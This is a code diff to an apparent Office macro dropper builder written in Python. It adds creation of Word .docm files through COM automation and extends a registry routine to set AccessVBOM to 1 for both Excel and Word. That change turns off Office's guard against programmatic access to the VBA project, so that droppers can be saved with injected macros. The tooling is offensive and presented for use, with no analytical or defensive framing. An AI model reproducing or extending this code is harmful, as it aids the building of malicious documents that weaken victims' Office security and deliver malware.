@@ -24,7 +24,7 @@ import time
 import sys
 import openpyxl
 import binascii
-import docx
+
 
 sys.coinit_flags = 0
 
@@ -101,15 +101,24 @@ def create_document(file, type):
         wb = openpyxl.load_workbook(file, keep_vba=True)
         wb.save(file)
     elif type == "docm":
-        doc = docx.Document()
-        doc.save(file)
+        com_instance = win32com.client.Dispatch("Word.Application")
+        com_instance.Visible = False
+        worddoc = com_instance.Documents.Add()
+        worddoc.SaveAs(file, FileFormat=13)
+        com_instance.Quit()
 
 
 def add_regkey():
-    key = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER,
+    key1 = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER,
                                 "Software\\Microsoft\\Office\\16.0\\Excel"
                                 + "\\Security", 0, win32con.KEY_ALL_ACCESS)
-    win32api.RegSetValueEx(key, "AccessVBOM", 0, win32con.REG_DWORD, 1)
+    key2 = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER,
+                                "Software\\Microsoft\\Office\\16.0\\Word"
+                                + "\\Security", 0, win32con.KEY_ALL_ACCESS)
+
+
+    win32api.RegSetValueEx(key1, "AccessVBOM", 0, win32con.REG_DWORD, 1)
+    win32api.RegSetValueEx(key2, "AccessVBOM", 0, win32con.REG_DWORD, 1)
 
 
 def include_office(file, type, creation_flag):
@@ -193,7 +202,10 @@ def include_office(file, type, creation_flag):
     com_instance.DisplayAlerts = False
     print(f'{"Saving Dropper...":32}', end='')
     try:
-        objworkbook.SaveAs(file, None, '', '')
+        if type == 'xlsm':
+            objworkbook.SaveAs(file, None, '', '')
+        elif type == 'docm':
+            objworkbook.SaveAs(file, FileFormat=13)
         time.sleep(1)
     except Exception:
         print(f'[FAILED]')
